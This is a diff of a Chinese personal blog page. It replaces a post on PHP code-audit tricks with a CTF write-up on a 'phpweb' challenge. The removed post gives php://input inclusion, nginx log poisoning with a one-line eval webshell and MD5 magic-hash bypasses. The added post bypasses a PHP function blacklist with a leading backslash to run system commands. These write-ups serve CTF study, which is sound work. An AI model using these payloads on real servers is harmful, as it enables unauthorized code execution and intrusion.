@@ -19,24 +19,24 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="常用的php伪协议1.php:&#x2F;&#x2F;input        ——用于读取原始的 POST 数据，当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post写入想要执行的php代码，php执行时会将post内容当作文件内容2.php:&#x2F;&#x2F;filter         ——用于读取和修改文件内容，比如对文件进行编码转换">
+    <meta name="description" content="根据形式，猜测func是命令，p是参数，尝试修改func为phpinfo，发现被过滤了  尝试绕过过滤，php中，\被认定为特殊字符，所以\phpinfo就会绕过过滤，发现index.php文件  采用highlight_file显示当前页面源代码，由于页面刷新速度较快，这里建议用bp抓包或者快速复制下来（我是复制的）  func&#x3D;highlight_file&amp;p&#x3D;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="web代码审计">
-<meta property="og:url" content="http://zer0-qiao.github.io/2025/01/18/web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/index.html">
+<meta property="og:title" content="朱雀组]phpweb1">
+<meta property="og:url" content="http://zer0-qiao.github.io/2025/01/19/%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb1/index.html">
 <meta property="og:site_name" content="Zer0-qiao">
-<meta property="og:description" content="常用的php伪协议1.php:&#x2F;&#x2F;input        ——用于读取原始的 POST 数据，当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post写入想要执行的php代码，php执行时会将post内容当作文件内容2.php:&#x2F;&#x2F;filter         ——用于读取和修改文件内容，比如对文件进行编码转换">
+<meta property="og:description" content="根据形式，猜测func是命令，p是参数，尝试修改func为phpinfo，发现被过滤了  尝试绕过过滤，php中，\被认定为特殊字符，所以\phpinfo就会绕过过滤，发现index.php文件  采用highlight_file显示当前页面源代码，由于页面刷新速度较快，这里建议用bp抓包或者快速复制下来（我是复制的）  func&#x3D;highlight_file&amp;p&#x3D;">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2025-01-18T14:40:32.000Z">
-<meta property="article:modified_time" content="2025-01-18T15:09:25.807Z">
+<meta property="article:published_time" content="2025-01-19T13:34:51.000Z">
+<meta property="article:modified_time" content="2025-01-19T13:48:25.539Z">
 <meta property="article:author" content="John Doe">
 <meta property="article:tag" content="原创">
 <meta property="article:tag" content="web">
-<meta property="article:tag" content="代码审计">
+<meta property="article:tag" content="php">
 <meta name="twitter:card" content="summary_large_image">
   
   
   
-  <title>web代码审计 - Zer0-qiao</title>
+  <title>朱雀组]phpweb1 - Zer0-qiao</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -215,7 +215,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="web代码审计"></span>
+            <span id="subtitle" data-typed-text="朱雀组]phpweb1"></span>
           
         </div>
 
@@ -226,8 +226,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2025-01-18 22:40" pubdate>
-          2025年1月18日 晚上
+        <time datetime="2025-01-19 21:34" pubdate>
+          2025年1月19日 晚上
         </time>
       </span>
     
@@ -238,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          855 字
+          252 字
         
       </span>
     
@@ -249,7 +249,7 @@
         
         
         
-          8 分钟
+          3 分钟
         
       </span>
     
@@ -295,58 +295,82 @@
       <div class="container nopadding-x-md" id="board-ctn">
         <div id="board">
           <article class="post-content mx-auto">
-            <h1 id="seo-header">web代码审计</h1>
+            <h1 id="seo-header">朱雀组]phpweb1</h1>
             
             
               <div class="markdown-body">
                 
-                <ol>
-<li>常用的php伪协议<br>1.php:&#x2F;&#x2F;input        ——用于读取原始的 POST 数据，当传入的参数作为文件名打开时，可以将参数设为php:&#x2F;&#x2F;input,同时post写入想要执行的php代码，php执行时会将post内容当作文件内容<br>2.php:&#x2F;&#x2F;filter         ——用于读取和修改文件内容，比如对文件进行编码转换、数据解密等操作。</li>
-<li>MD5哈希计算后以0E开头的原值和哈希值：<br>QNKCDZO           0e830400451993494058024219903391<br>240610708         0e462097431906509019562988736854<br>s878926199a       0e545993274517709034328855841020<br>s155964671a       0e342768416822451524974117254469<br>s214587387a       0e848240448830537924465865611904<br>s214587387a       0e848240448830537924465865611904<br>s878926199a       0e545993274517709034328855841020<br>s1091221200a      0e940624217856561557816327384675<br>s1885207154a      0e509367213418206700842008763514<br>s1502113478a      0e861580163291561247404381396064<br>s1885207154a      0e509367213418206700842008763514<br>s1836677006a      0e481036490867661113260034900752<br>s155964671a       0e342768416822451524974117254469<br>s1184209335a      0e072485820392773389523109082030<br>s1665632922a      0e731198061491163073197128363787<br>s1502113478a      0e861580163291561247404381396064<br>s1836677006a      0e481036490867661113260034900752<br>s1091221200a      0e940624217856561557816327384675<br>s155964671a       0e342768416822451524974117254469<br>s1502113478a      0e861580163291561247404381396064<br>s155964671a       0e342768416822451524974117254469<br>s1665632922a      0e731198061491163073197128363787<br>s155964671a       0e342768416822451524974117254469<br>s1091221200a      0e940624217856561557816327384675<br>s1836677006a      0e481036490867661113260034900752<br>s1885207154a      0e509367213418206700842008763514<br>s532378020a       0e220463095855511507588041205815<br>s878926199a       0e545993274517709034328855841020<br>s1091221200a      0e940624217856561557816327384675<br>s214587387a       0e848240448830537924465865611904<br>s1502113478a      0e861580163291561247404381396064<br>s1091221200a      0e940624217856561557816327384675<br>s1665632922a      0e731198061491163073197128363787<br>s1885207154a      0e509367213418206700842008763514<br>s1836677006a      0e481036490867661113260034900752<br>s1665632922a      0e731198061491163073197128363787<br>s878926199a       0e545993274517709034328855841020</li>
-</ol>
-<p>1.ctf.show_web3</p>
+                
+<p> 根据形式，猜测func是命令，p是参数，尝试修改func为phpinfo，发现被过滤了<br> <br> 尝试绕过过滤，php中，\被认定为特殊字符，所以\phpinfo就会绕过过滤，发现index.php文件<br> <br> 采用highlight_file显示当前页面源代码，由于页面刷新速度较快，这里建议用bp抓包或者快速复制下来（我是复制的）<br>  func&#x3D;highlight_file&amp;p&#x3D;index.php<br><!DOCTYPE html></p>
+<html>
+<head>
+    <title>phpweb</title>
+    <style type="text/css">
+        body {
+            background: url("bg.jpg") no-repeat;
+            background-size: 100%;
+        }
+        p {
+            color: white;
+        }
+    </style>
+</head>
 
-<p> 这段 PHP 代码使用了 include 语句,试图从 $_GET 超全局变量中获取名为 url 的参数值，并将该值对应的文件包含进来。<br> 所以我们可以直接写入php文件，通过GET请求输入url&#x3D;php:&#x2F;&#x2F;input。 而php代码的内容为执行系统命令,查看当前目录下所有文件。<br>    ?url&#x3D;php:&#x2F;&#x2F;input            – GET请求的url中拼接伪协议<br>    <?php system('ls')?>    – post请求内容构造需要执行的代码<br> <br> 这里我利用的是hackbar，执行php代码后，回显得到ctf_go_go_go index.php文件，很明显，flag就在这个文件中。<br> <br> 直接在url地址栏中输入url参数,访问ctf_go_go_go文件，就可以得到flag:<br>  ?url&#x3D;ctf_go_go_go<br> </p>
-<p>2.ctf.show_web4</p>
+<body>
+<script language=javascript>
+    setTimeout("document.form1.submit()",5000)
+</script>
+<p>
+    <?php
+    $disable_fun = array("exec","shell_exec","system","passthru","proc_open","show_source","phpinfo","popen","dl","eval","proc_terminate","touch","escapeshellcmd","escapeshellarg","assert","substr_replace","call_user_func_array","call_user_func","array_filter", "array_walk",  "array_map","registregister_shutdown_function","register_tick_function","filter_var", "filter_var_array", "uasort", "uksort", "array_reduce","array_walk", "array_walk_recursive","pcntl_exec","fopen","fwrite","file_put_contents");
+    function gettime($func, $p) {
+        $result = call_user_func($func, $p);
+        $a= gettype($result);
+        if ($a == "string") {
+            return $result;
+        } else {return "";}
+    }
+    class Test {
+        var $p = "Y-m-d h:i:s a";
+        var $func = "date";
+        function __destruct() {
+            if ($this->func != "") {
+                echo gettime($this->func, $this->p);
+            }
+        }
+    }
+    $func = $_REQUEST["func"];
+    $p = $_REQUEST["p"];
 
-<p> 看起来和ctf.show_web3很像，但我们测试文件包含没有成功，所以这里考虑日志注入:<br>  ?url&#x3D;&#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log<br>    &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log是 Nginx 服务器默认的访问日志文件路径。<br> <br> 发现可以得到日志文件，接着利用bp抓包，在User-Agent后面插入一句话木马:<br>  <?php @eval($_POST['a']);?><br> <br> 用蚁剑进行连接测试 ，注意URL地址写的是日志地址，并且应该是用http进行连接（我一开始用的https，报错了）。<br> <br> 连接成功后，在www目录下发现flag.txt文件，即可得到flag.<br> </p>
-<p>3.ctf.show_web5</p>
-
-<p> 附上源码：<br>  &lt;?php<br>        $flag&#x3D;””;<br>        $v1&#x3D;$_GET[‘v1’];<br>        $v2&#x3D;$_GET[‘v2’];<br>        if(isset($v1) &amp;&amp; isset($v2)){<br>            if(!ctype_alpha($v1)){<br>                die(“v1 error”);<br>            }<br>            if(!is_numeric($v2)){<br>                die(“v2 error”);<br>            }<br>            if(md5($v1)&#x3D;&#x3D;md5($v2)){<br>                echo $flag;<br>            }<br>        }else{</p>
-<pre><code class="hljs">        echo &quot;where is flag?&quot;;
+<pre><code class="hljs">if ($func != null) &#123;
+    $func = strtolower($func);
+    if (!in_array($func,$disable_fun)) &#123;
+        echo gettime($func, $p);
+    &#125;else &#123;
+        die(&quot;Hacker...&quot;);
     &#125;
+&#125;
 ?&gt;
 </code></pre>
-<p> 源码分析：<br>    isset($v1) &amp;&amp; isset($v2)：判断 v1 和 v2 两个参数是否都被设置了（即用户是否通过 URL 利用GET方式传递了这两个参数），如果没有都设置，则直接输出 “where is flag?” 提示信息。<br>    !ctype_alpha($v1)：使用 ctype_alpha 函数来验证 $v1 参数内容是否全部由字母组成，如果不是，则输出 “v1 error” 并终止脚本执行（通过 die 函数）。<br>    !is_numeric($v2)：使用 is_numeric 函数验证 $v2 参数内容是否为数字，如果不是数字则输出 “v2 error” 并终止脚本执行。<br>    md5($v1)&#x3D;&#x3D;md5($v2)：对 $v1 和 $v2 分别进行 MD5 哈希计算，然后比较它们的哈希值是否相等，如果相等就输出 $flag 的值，这里存在一个漏洞利用点，因为 PHP 中 md5 函数对于一些特殊的字符串（比如以 0e 开头且后面数字部分在比较时会被当作科学计数法的零值的情况）在进行比较时会出现哈希值相等但原始值不同的 “哈希碰撞” 情况，可以利用这个特性来绕过验证获取 flag（前提是能找到符合条件的合适字符串对）。</p>
-<p> 所以简单来说就是，md5碰撞，只要是0e开头MD5值，默认为相等，v1为字符，v2为数值<br>   payload:?v1&#x3D;QNKCDZO&amp;v2&#x3D;240610708<br> 返回flag。<br> </p>
-
+</p>
+<form  id=form1 name=form1 action="index.php" method=post>
+    <input type=hidden id=func name=func value='date'>
+    <input type=hidden id=p name=p value='Y-m-d h:i:s a'>
+</body>
+</html>
+ 可以发现大量php函数被禁用，而反序列化函数没有被禁用，所以我们这里采用system执行命令。
+  查找flag：func=\system&p=find / -name 'flag*'
+ 
+ 我们猜测flag在flagoefiu4r93目录文件中:
+  func=\system&p=cat /tmp/flagoefiu4r93
+ 
+ 这样就找出了flag (当然也可以一开始就先尝试system命令，会节省不少时间)
                 
               </div>
             
             <hr/>
             <div>
               <div class="post-metas my-3">
-  
-    <div class="post-meta mr-3 d-flex align-items-center">
-      <i class="iconfont icon-category"></i>
-      
-
-<span class="category-chains">
-  
-  
-    
-      <span class="category-chain">
-        
-  <a href="/categories/Java/" class="category-chain-item">Java</a>
-  
-  
-
-      </span>
-    
-  
-</span>
-
-    </div>
   
   
     <div class="post-meta">
@@ -356,7 +380,7 @@
       
         <a href="/tags/web/" class="print-no-link">#web</a>
       
-        <a href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="print-no-link">#代码审计</a>
+        <a href="/tags/php/" class="print-no-link">#php</a>
       
     </div>
   
@@ -368,8 +392,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>web代码审计</div>
-      <div>http://zer0-qiao.github.io/2025/01/18/web代码审计/</div>
+      <div>朱雀组]phpweb1</div>
+      <div>http://zer0-qiao.github.io/2025/01/19/朱雀组-phpweb1/</div>
     </div>
     <div class="license-meta">
       
@@ -381,7 +405,7 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2025年1月18日</div>
+          <div>2025年1月19日</div>
         </div>
       
       
@@ -413,18 +437,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2025/01/19/%E6%9C%B1%E9%9B%80%E7%BB%84-phpweb1/" title="朱雀组]phpweb1">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">朱雀组]phpweb1</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2025/01/17/sql%E6%B3%A8%E5%85%A5/" title="sql注入">
-                        <span class="hidden-mobile">sql注入</span>
+                      <a href="/2025/01/18/web%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" title="web代码审计">
+                        <span class="hidden-mobile">web代码审计</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
